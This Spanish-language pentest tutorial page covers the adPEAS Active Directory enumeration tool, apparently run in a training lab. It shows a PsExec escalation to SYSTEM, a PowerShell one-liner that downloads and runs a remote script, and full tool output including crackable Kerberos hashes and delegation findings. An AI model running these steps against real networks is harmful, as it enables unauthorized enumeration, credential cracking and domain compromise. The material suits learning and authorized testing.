# ADPeas

## Que es ADPeas <a href="#introduccion-a-adpeas" id="introduccion-a-adpeas"></a>

Una herramienta muy interesante que arroja mucha información con una sola ejecución es ADPeas.ps1:



{% embed url="https://github.com/61106960/adPEAS" %}

### Saliendo del contexto de usuario local <a href="#saliendo-del-contexto-de-usuario-local" id="saliendo-del-contexto-de-usuario-local"></a>

`PsExec` es una herramienta ligada a la suite de Sysinternals de Microsoft y permite la ejecución de procesos en sistemas remotos. Es particularmente útil para administradores de sistemas, pero también es conocido por ser utilizado por atacantes o pentesters para moverse lateralmente a través de una red.

1. **Contexto de Autenticación**: Cuando interactúas con Directorio Activo (AD), lo haces a través de un contexto de autenticación, que esencialmente dicta qué derechos y permisos tiene el usuario o proceso actual. Si estás ejecutando comandos en una máquina comprometida con un contexto local (por ejemplo, una shell reversa que no tiene un token de autenticación para AD), es posible que no puedas consultar o interactuar con el AD aunque estés en un dominio.
2. **Cambiar Contexto**: Usando `PsExec`, puedes ejecutar comandos o programas en el contexto de otro usuario, o incluso en el contexto de SYSTEM si tienes los permisos necesarios. Al hacerlo, estás esencialmente "cambiando" tu contexto de autenticación, lo que puede darte los derechos necesarios para interactuar con AD.

En resumen, aunque no es _estrictamente necesario_ usar `PsExec` para salir del contexto de usuario local y enumerar AD (hay otras técnicas y herramientas que pueden lograr lo mismo), `PsExec` es una herramienta versátil que permite a los atacantes y pentesters cambiar de contexto de autenticación y moverse lateralmente a través de una red. Por lo tanto, es una herramienta útil en escenarios donde se necesita ampliar el alcance o cambiar el contexto para interactuar con AD.

<figure><img src="https://books.spartan-cybersec.com/~gitbook/image?url=https%3A%2F%2F1580805812-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FzDuZE3U19tNNqSAmcpyE%252Fuploads%252FBcpoWao2PVRUKRRwPupH%252Fimage.png%3Falt%3Dmedia%26token%3De8565fb0-37f7-4b76-86de-531252525a49&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=a05131bb&#x26;sv=2" alt=""><figcaption></figcaption></figure>

**Un usuario administrator local no puede interactuar con el dominio y por lo tanto es necesario salir del contexto y migrar a NT AUTHORITY SYSTEM. Estos pasos se realizaran desde una sesion de RDP:**

```
PS C:\Users\Administrator> net group /domain
The request will be processed at a domain controller for domain infinity.com.

System error 5 has occurred.

Access is denied.
```

Para salir del contexto, se utiliza PSExec:

```
PS C:\Users\Administrator\Desktop> .\PsExec64.exe -i -s cmd.exe
```

Despues de esto saldra una nueva pestaña que si podra interactuar con el dominio:

<figure><img src="https://books.spartan-cybersec.com/~gitbook/image?url=https%3A%2F%2F1580805812-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FzDuZE3U19tNNqSAmcpyE%252Fuploads%252FOXzTx96PuxtfnbNPosdW%252Fimage.png%3Falt%3Dmedia%26token%3D5ee0af33-3064-47ed-b9b1-fba22397ef11&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=3804b91c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Después de lo anterior, tendremos permisos necesarios para interactuar con el dominio desde ADPeas.ps1:

{% code overflow="wrap" %}
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1'); Invoke-adPEAS
```
{% endcode %}

{% code overflow="wrap" %}
```
PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
PS C:\Windows\system32> Invoke-adPEAS

               _ _____  ______           _____
              | |  __ \|  ____|   /\    / ____|
      ____  __| | |__) | |__     /  \  | (___
     / _  |/ _  |  ___/|  __|   / /\ \  \___ \
    | (_| | (_| | |    | |____ / ____ \ ____) |
     \__,_|\__,_|_|    |______/_/    \_\_____/
                                            Version 0.8.13

    Active Directory Enumeration
    by @61106960

    Legend
        [?] Searching for juicy information
        [!] Found a vulnerability which may can be exploited in some way
        [+] Found some interesting information for further investigation
        [*] Some kind of note
        [#] Reserved


[?] +++++ Searching for Juicy Active Directory Information +++++

[?] +++++ Checking General Domain Information +++++
[+] Found general Active Directory domain information for domain 'spartancybersec.corp':
Domain Name:                            spartancybersec.corp
Domain SID:                             S-1-5-21-1861162130-2580302541-221646211
Domain Functional Level:                Windows 2016
Forest Name:                            spartancybersec.corp
Forest Children:                        No Subdomain[s] available
Domain Controller:                      First-DC.spartancybersec.corp

[?] +++++ Checking Domain Policies +++++
[+] Found password policy of domain 'spartancybersec.corp':
Minimum Password Age:                   1 days
Maximum Password Age:                   42 days
[+] Minimum Password Length:            7 character
Password Complexity:                    Enabled
[!] Lockout Account:                    Disabled
Reversible Encryption:                  Disabled
[+] Found Kerberos policy of domain 'spartancybersec.corp':
Maximum Age of TGT:                     10 hours
Maximum Age of TGS:                     600 minutes
Maximum Clock Time Difference:          5 minutes
Krbtgt Password Last Set:               09/19/2022 23:34:18

[?] +++++ Checking Domain Controller, Sites and Subnets +++++
[+] Found domain controller of domain 'spartancybersec.corp':
DC Host Name:                           First-DC.spartancybersec.corp
DC Roles:                               SchemaRole,NamingRole,PdcRole,RidRole,InfrastructureRole
DC IP Address:                          10.0.1.100
Site Name:                              Default-First-Site-Name


[?] +++++ Checking Forest and Domain Trusts +++++
[+] Found configured domain trusts of 'spartancybersec.corp':
Target Domain Name:                     vikingscybersec.corp
Target Domain SID:                      S-1-5-21-3191546187-884582097-4033286759
Flags:                                  DIRECT_OUTBOUND, DIRECT_INBOUND
TrustAttributes:                        FILTER_SIDS

[?] +++++ Checking Juicy Permissions +++++

[?] +++++ Checking Add-Computer Permissions +++++
[+] Filtering found identities that can add a computer object to domain '':
[!] Every member of group 'Authenticated Users' can add a computer to domain ''

distinguishedName:                      CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-11
memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=spartancybersec,DC=corp
                                        CN=Users,CN=Builtin,DC=spartancybersec,DC=corp


[?] +++++ Checking DCSync Permissions +++++
[+] Filtering found identities that can perform DCSync in domain '':
[+] The identity 'admin' is a non-default account and can DCSync a domain controller
sAMAccountName:                         admin
distinguishedName:                      CN=admin,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1008
memberOf:                               CN=Domain Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Administrators,CN=Builtin,DC=spartancybersec,DC=corp
[*] accountexpires:                     This identity has been expired since 01/01/1601 00:00:00
pwdLastSet:                             09/29/2023 02:12:11
lastLogonTimestamp:                     09/29/2023 02:03:37
userAccountControl:                     NORMAL_ACCOUNT
[+] admincount:                         This identity is or was member of a high privileged admin group


[?] +++++ Checking LAPS Permissions +++++

[?] +++++ Searching for GPO local group membership Information +++++

[?] +++++ Searching for Active Directory Certificate Services Information +++++
WARNING: [Get-adPEASCA] Error retrieving ADCS information: Exception calling "FindAll" with "0" argument(s): "There is no such object on the server.
"

[?] +++++ Searching for Vulnerable Certificate Templates +++++

[?] +++++ Searching for Credentials Exposure +++++

[?] +++++ Searching for ASREProastable User +++++
[!] Found ASREProastable User 'asrep.user':
sAMAccountName:                         asrep.user
distinguishedName:                      CN=asrep.user,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1128
pwdLastSet:                             09/29/2023 02:03:36
lastLogonTimestamp:                     09/29/2023 02:03:36
[+] userAccountControl:                 NORMAL_ACCOUNT, DONT_REQ_PREAUTH

Hashcat usage: Hashcat -m 18200
$krb5asrep$23$asrep.user@spartancybersec.corp:8995909962b0fd21a925ca8bfbf9c894$61322316eedd52d638ad1dabb7b011559f0dffb36de32b252d24291eb6a9fbe1a237acc2143a8e6f70bb65c3075caf28d22b92b491a87a8bc48d28233c1abc56b07239533fa9571c7c89e599e53a7551b03d8c702cf3759c19f75ea0f24c5cedd669fd57b6422c4b73ea95161b754f408306c479d7844c0a6bc2a9a15249b42ad8acf83f5afcd4d9b892835150a9bd49d377c6d548f9405139492a8bcf7ea740a31b986604cf05f1eb5f16c2d1cb826fd05417ab1550b3d2ce9ae2fce985b6349f62f788418a44c0e058107c4d5433dba37b0038c5b3f61b11bc0e671c2b77e6522cafca0cde6b8730a4808e803de91a78c34adb774100fa1761512e

[?] +++++ Searching for Kerberoastable User +++++
[!] Found Kerberoastable User 'roast.user':
sAMAccountName:                         roast.user
distinguishedName:                      CN=roast.user,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1127
pwdLastSet:                             09/29/2023 02:03:36
lastLogonTimestamp:                     09/29/2023 02:03:36
userAccountControl:                     NORMAL_ACCOUNT

Hashcat usage: hashcat -m 13100
$krb5tgs$23$*roast.user$spartancybersec.corp$MSSQL/sql.spartancybersec.corp*$A8DDCBEA1C6AEFE971C4BA672CBC9F32$8D3C7A07D449581969F4AB91BCDBA8FB06FFC89DB32DBF7E1A749CC4ED6B75F94081A66AC6800DF451243CCFFC99ECF84B329247D3C8ABF0E8B81684171DC99E1D1261BED8BEBB55FB094E1349FF0FC976C5F6DDA37F3BFF6263CCAA7A4A1466893493B92D5B45FD49D6793070134551E1CA418528F76521F4E76CA67FC27A36207507A5E6CC4F26211816F7455CFD3C9A32B1DE98C3F8C73CB70D25D8DDFC67084316856736B1D363177BA112F57096D188DB465A2A43B3FC3902D8BED0CC200A3273F8798FBA72A9585E6E2F728DEDE48CB678411064FDC0A58011A42B93301D4F98F47DD26E02DBECBF8FF7053472879C4105F66CACA699B62D6DFC70E91351AC5F8A778A622DACB54BF9B0E7D91D264A23D62014B2E5CB4088B5ED8F1F13C46F7CBA74D5BFB4207F3FE5FAB512CD3FE9E1A41AE02C710895F656CF8562B58F516E5B656162F22CBC9FA2E1FF5E58A8D19491D751D187AAC82810EEF259A8FB78373B37A192A8E8BB553D437E765B459A4AFB2F7BD6E0B4CC775244503407861063F697AA79212EB01CF96B81A8A18666F3E2EC108DC45C24EF8392F1144D7DBB797DFB0B5E078EB707573B1FCE19B7CF0196684899100E8716D6AAF790804D6F755832CB61666A982937193FF2681632448BD1BC670552458B6FF1ECD6FA7384CB1426BE5332CF363624D7E58E57EB6EAD8D5E637B5F4EB5FCF9660157C5A4D02BE879D341189067A771AED1ABB44C2FF194B21D64F50D6760B229FB8B654347AE9E22E3D41A93EAFD655B71C63BD25ECA4082F82719CAC5B3A22A085C994925C876054DADB4440A047E7A0E2290EB39D9FDE403285E25815EEB16AB9382C2039A97FE9A945B7C55B2191EE9BAF73A004916D2C36423A33CA219362B864793D5D6E4ED3B62FE9EB584DE00AEBE7FD83DEB19C8D78CD24F2F9915824E79A56EA87C0598DCD00AC8A38FFB28C8B3128845EFF57A52904D4E3E70E1F1D575E67B4CB93C4D467CBF4AB94280316C605795347C90B174C9B2B05F2B65E886538400A240C5ABC729CA0BC63A35675C1790A28C43EAC15EA322E29AF15CDE522BADA7A44F6D0CD7D73EA110E860C92CB839B27E6DF530F7D30C1C886150A4D51DAC872DF5210C81A9BD22092202E70C03EE542F3690B82781C18741FB747298A33C1226D671C5F1B00A7B5D1DD46C8C7184466EB83F5D38A1E1297436D9DD845704A489A38ABF11FFD996DF0A97D703A4D611DFEF66FFAAC80F5DA75FBA4A6D71416D193A15F1C195E8DAB0FD2EC8AB9EC0952657607965C8FE0B1C1AC66D8CB36804A497AFD146687BD3A337630ACF8707406E5B27C56665C5C6BB6CEECC6FBB95D3E472FA818BEE0F1A2466B8807E2D524746EF79B77A6E104FDA867BF23F80293BD7C64329663ED5F6FA02CF9658B4E2EFAC662502B3C21592BE2C4B1155AF70C07A87CB1143C2EDFE86FE75E70E21014E4E072EE49C1A1ACA6102F4FEE01FACBB2F4629988FA2B7CA4A91583604B81AE6FD06393C4A915362796ED4D780B1FEC6C7C510B43B4D68971FAEB491F84F48A48DCB680639BBA7551188102BF48DFE974D8A94B3F12A619526C2925A28B5E22653A03A6C97BA72478531FC76CD24E9AEAD779F07C6778D2212D77DF238DCBBB9E4234201D40824654CE64258DD8A6A82D5862DA71BE067FFADBE78282552EE5DDD0D33AADB0C6F06

[?] +++++ Searching for User with 'Linux/Unix Password' attribute +++++

[?] +++++ Searching for Computer with enabled and readable LAPS attribute +++++

[?] +++++ Searching for Group Managed Service Account (gMSA) +++++

[?] +++++ Searching for Credentials in SYSVOL Group Policy Files +++++

[?] +++++ Searching for Sensitive Information in NETLOGON Share +++++

[?] +++++ Searching for Delegation Issues +++++

[?] +++++ Searching for Computer with Unconstrained Delegation Rights +++++

[?] +++++ Searching for Computer with Constrained Delegation Rights +++++
[!] Found constrained delegation rights for Computer 'Suspicious-PC$':
sAMAccountName:                         Suspicious-PC$
distinguishedName:                      CN=Suspicious-PC,CN=Computers,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1116
[+] msDS-AllowedToDelegateTo:           HTTP/First-DC.spartancybersec.corp/spartancybersec.corp
                                        HTTP/First-DC.spartancybersec.corp
                                        HTTP/First-DC
pwdLastSet:                             09/19/2022 23:40:27
userAccountControl:                     WORKSTATION_TRUST_ACCOUNT

[!] Found constrained delegation rights for Computer 'USER-SERVER$':
sAMAccountName:                         USER-SERVER$
distinguishedName:                      CN=USER-SERVER,CN=Computers,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1129
operatingsystem:                        Windows Server 2019 Datacenter
[+] msDS-AllowedToDelegateTo:           HOST/First-DC.spartancybersec.corp/spartancybersec.corp
                                        HOST/First-DC.spartancybersec.corp
                                        HOST/First-DC
pwdLastSet:                             09/19/2022 23:43:39
[*] lastLogonTimestamp:                 09/19/2022 23:43:39 (Computer is likely not online anymore!)
userAccountControl:                     WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION


[?] +++++ Searching for Computer with Resource-Based Constrained Delegation Rights +++++

[?] +++++ Searching for User with Constrained Delegation Rights +++++
[!] Found constrained delegation rights for User 'constrained.user':
sAMAccountName:                         constrained.user
distinguishedName:                      CN=constrained.user,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1115
[+] msDS-AllowedToDelegateTo:           CIFS/First-DC.spartancybersec.corp/spartancybersec.corp
                                        CIFS/First-DC.spartancybersec.corp
                                        CIFS/First-DC
pwdLastSet:                             09/29/2023 02:03:21
lastLogonTimestamp:                     09/29/2023 02:03:21
userAccountControl:                     NORMAL_ACCOUNT


[?] +++++ Searching for User with Resource-Based Constrained Delegation Rights +++++

[?] +++++ Starting Account Enumeration +++++

[?] +++++ Searching for Azure AD Connect +++++

[?] +++++ Searching for Users in High Privileged Groups +++++
[+] Found members in group 'BUILTIN\Administrators':
GroupName:                              Domain Admins
distinguishedName:                      CN=Domain Admins,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-512
[+] description:                        Designated administrators of the domain

GroupName:                              Enterprise Admins
distinguishedName:                      CN=Enterprise Admins,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-519
[+] description:                        Designated administrators of the enterprise

sAMAccountName:                         admin
distinguishedName:                      CN=admin,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1008
memberOf:                               CN=Domain Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Administrators,CN=Builtin,DC=spartancybersec,DC=corp
[*] accountexpires:                     This identity has been expired since 01/01/1601 00:00:00
pwdLastSet:                             09/29/2023 02:12:11
lastLogonTimestamp:                     09/29/2023 02:03:37
userAccountControl:                     NORMAL_ACCOUNT
[+] admincount:                         This identity is or was member of a high privileged admin group

sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Domain Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Enterprise Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Schema Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Administrators,CN=Builtin,DC=spartancybersec,DC=corp
[+] description:                        Built-in account for administering the computer/domain
[*] accountexpires:                     This identity has been expired since 01/01/1601 00:00:00
pwdLastSet:                             09/19/2022 23:22:58
userAccountControl:                     NORMAL_ACCOUNT
[+] admincount:                         This identity is or was member of a high privileged admin group

[+] Found members in group 'SPARTANCYBERSEC\Domain Admins':
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Domain Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Enterprise Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Schema Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Administrators,CN=Builtin,DC=spartancybersec,DC=corp
[+] description:                        Built-in account for administering the computer/domain
[*] accountexpires:                     This identity has been expired since 01/01/1601 00:00:00
pwdLastSet:                             09/19/2022 23:22:58
userAccountControl:                     NORMAL_ACCOUNT
[+] admincount:                         This identity is or was member of a high privileged admin group

sAMAccountName:                         admin
distinguishedName:                      CN=admin,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1008
memberOf:                               CN=Domain Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Administrators,CN=Builtin,DC=spartancybersec,DC=corp
[*] accountexpires:                     This identity has been expired since 01/01/1601 00:00:00
pwdLastSet:                             09/29/2023 02:12:11
lastLogonTimestamp:                     09/29/2023 02:03:37
userAccountControl:                     NORMAL_ACCOUNT
[+] admincount:                         This identity is or was member of a high privileged admin group

[+] Found members in group 'SPARTANCYBERSEC\Enterprise Admins':
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Domain Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Enterprise Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Schema Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Administrators,CN=Builtin,DC=spartancybersec,DC=corp
[+] description:                        Built-in account for administering the computer/domain
[*] accountexpires:                     This identity has been expired since 01/01/1601 00:00:00
pwdLastSet:                             09/19/2022 23:22:58
userAccountControl:                     NORMAL_ACCOUNT
[+] admincount:                         This identity is or was member of a high privileged admin group

[+] Found members in group 'SPARTANCYBERSEC\Group Policy Creator Owners':
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Domain Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Enterprise Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Schema Admins,CN=Users,DC=spartancybersec,DC=corp
                                        CN=Administrators,CN=Builtin,DC=spartancybersec,DC=corp
[+] description:                        Built-in account for administering the computer/domain
[*] accountexpires:                     This identity has been expired since 01/01/1601 00:00:00
pwdLastSet:                             09/19/2022 23:22:58
userAccountControl:                     NORMAL_ACCOUNT
[+] admincount:                         This identity is or was member of a high privileged admin group

[+] Found members in group 'SPARTANCYBERSEC\DnsAdmins':
sAMAccountName:                         dnsadmin.user
distinguishedName:                      CN=dnsadmin.user,CN=Users,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1113
memberOf:                               CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
pwdLastSet:                             09/29/2023 02:03:19
lastLogonTimestamp:                     09/29/2023 02:03:19
userAccountControl:                     NORMAL_ACCOUNT


[?] +++++ Searching for High Privileged Users with a password older 5 years +++++

[?] +++++ Searching for High Privileged User which may not require a Password +++++

[?] +++++ Starting Computer Enumeration +++++

[?] +++++ Searching for Domain Controllers +++++
[+] Found Domain Controller 'FIRST-DC$':
sAMAccountName:                         FIRST-DC$
distinguishedName:                      CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
objectSid:                              S-1-5-21-1861162130-2580302541-221646211-1009
operatingsystem:                        Windows Server 2019 Datacenter
pwdLastSet:                             09/29/2023 02:00:31
lastLogonTimestamp:                     09/29/2023 02:00:40
[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
```
{% endcode %}
